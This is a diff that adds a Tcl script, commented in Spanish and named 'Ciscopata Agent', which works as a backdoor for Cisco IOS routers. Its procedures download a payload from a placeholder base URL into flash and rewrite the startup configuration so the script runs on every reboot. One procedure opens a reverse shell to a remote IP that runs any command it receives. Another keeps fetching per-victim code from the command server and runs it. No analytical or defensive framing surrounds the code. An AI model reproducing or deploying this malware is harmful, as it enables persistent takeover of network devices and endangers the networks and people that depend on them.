@@ -1,0 +1,110 @@
+#!/usr/bin/tclsh
+# VARIABLES GLOBALES
+# Tiempo de dormir en ms
+set Pavita 15000
+# Esta atendiendo ?
+set Atento 1
+# Variable despertadora
+set Cafeina 0
+# La Base ;)
+set URL http://URL-BASE-AQUI
+
+# Funcion para dormir por X milisegundos
+proc Tamarindo {ms} {
+ global Cafeina
+ after ${ms} set Cafeina 1
+ vwait Cafeina
+ set Cafeina 0
+}
+
+proc Infecta {victima} {
+ global URL
+ set f [open "${URL}/infect" r]
+ set d [read $f]
+ close $f
+ set f [open flash:/ciscopata w]
+ puts $f $d
+ close $f
+ set f [open "system:/running-config" r]
+ set d [read $f]
+ close $f
+ set d [string map {scheduler "no scheduler"} [string map {end !} $d]]
+ set d [string map {"no ip domain lookup" "ip domain lookup"} $d]
+ set f [open "nvram:/startup-config" w]
+ puts -nonewline $f $d
+ puts $f "do tclsh flash:/ciscopata"
+ puts $f !
+ puts $f end
+ close $f
+ set f [open "nvram:/vicid" w]
+ puts $f $victima
+ close $f
+}
+
+# Reverse Shell
+proc RevShell {ip port victima} {
+ set f [socket ${ip} ${port}]
+ puts $f "Ciscopata Agent v1.0\n\n"
+ set loop 1
+ while {$loop} {
+  puts -nonewline $f "\nciscopata@${victima}$ "
+  flush $f
+  gets $f d
+  if {[string length $d] > 0} {
+   set d [split $d "\n"]
+   foreach line $d {
+    if {"$line" == "exit"} {
+     puts $f "Adios amigo!!\n"
+     flush $f
+     close $f
+     set loop 0
+    } else {
+     if [catch {set res [exec $line]} err] {
+      puts $f "ERROR: $err\n"
+     } else {
+      puts $f $res
+     }
+    }
+   }
+  }
+ }
+}
+
+# Recibe comandos remotos a la vez que se reporta
+proc Reportate {victima} {
+ global Atento
+ global URL
+ global Pavita
+ set Atento 1
+ while {$Atento} {
+  catch {source ${URL}/C_${victima}/}
+  if {$Atento} {
+   Tamarindo ${Pavita}
+  }
+ }
+}
+
+proc Main {argv} {
+ if {![file exists "nvram:/vicid"]} {
+  if {[string length $argv]} {
+   Infecta ${argv}
+  } else {
+   return "\nERROR: no infectado\n"
+  }
+ } else {
+  set f [open "nvram:/vicid" r]
+  set victima [read $f]
+  close $f
+  if {[string length ${victima}] > 0} {
+   global Atento
+   set Atento 1
+   while {$Atento} {
+    Reportate $victima
+   }
+  } else {
+   return "\nERROR: no infectado\n"
+  }
+ }
+}
+
+Main $argv
